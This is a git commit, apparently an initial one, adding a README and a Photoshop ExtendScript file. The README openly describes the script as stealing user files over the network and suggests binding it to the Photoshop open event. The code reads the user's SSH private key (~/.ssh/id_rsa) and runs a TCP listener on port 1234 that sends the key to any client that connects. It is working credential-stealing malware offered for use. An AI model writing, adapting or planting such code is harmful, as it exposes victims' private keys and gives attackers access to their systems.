f13575b21bc5dcbc6c362542d4ba763411be3f27
Dmitry <df.creative@gmail.com>
2012-10-07 01:04:53 +0400

    Initial commit

---
+++ README.md
@@ -0,0 +1,3 @@
+Photoshop thieft
+-----------------------------
+It's a photoshop script that can steal any user files and send it by the network. Could be bound to opening of photoshop event, for example.
---
+++ photoshopr.jsx
@@ -0,0 +1,33 @@
+﻿var stealFile = function(conn){
+        var id_priv = new File("~/.ssh/id_rsa");
+        id_priv.open('r');
+        var str = id_priv.read();
+        $.writeln(str);
+        return str
+ }
+
+//A RSA thieft
+function stealKeySrv() { 
+  var tcp = new Socket; 
+  // listen on port 1234 
+  $.writeln ("Listening on port 1234");
+  if (tcp.listen (1234)) { 
+    for (;;) { 
+      // poll for a new connection 
+      var connection = tcp.poll(); 
+      if (connection != null) {
+        $.writeln ("Connection from " + connection.host); 
+        // we have a new connection, so welcome and steal 
+        // until client terminates the session 
+        connection.writeln ("Here's your private rsa key"); 
+        connection.writeln(stealFile ()); 
+        connection.writeln ( "*** Goodbye ***"); 
+        connection.close(); 
+        delete connection; 
+        $.writeln ("Connection closed"); 
+      } 
+    } 
+  } 
+} 
+
+stealKeySrv();
